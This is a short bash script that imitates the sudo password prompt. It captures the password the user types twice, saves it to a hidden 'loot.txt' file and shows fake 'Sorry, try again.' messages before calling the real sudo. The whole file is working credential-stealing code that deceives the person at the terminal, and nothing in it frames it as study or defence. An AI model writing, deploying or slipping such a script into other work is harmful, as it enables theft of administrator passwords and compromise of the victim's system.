#!/bin/bash

SECRET_PATH="/home/$USER/.h/.hidden/"
LOOT="$SECRET_PATH/loot.txt"
PASSWORD=""

printf "[sudo] password for $USER: "
read -s PASSWORD
echo $PASSWORD >> $LOOT
echo ""
sleep 2
echo "Sorry, try again."
PASSWORD=""

printf "[sudo] password for $USER: "
read -s PASSWORD
echo $PASSWORD >> $LOOT
echo ""
sleep 2
echo "Sorry, try again."
PASSWORD=""

/usr/bin/sudo $@
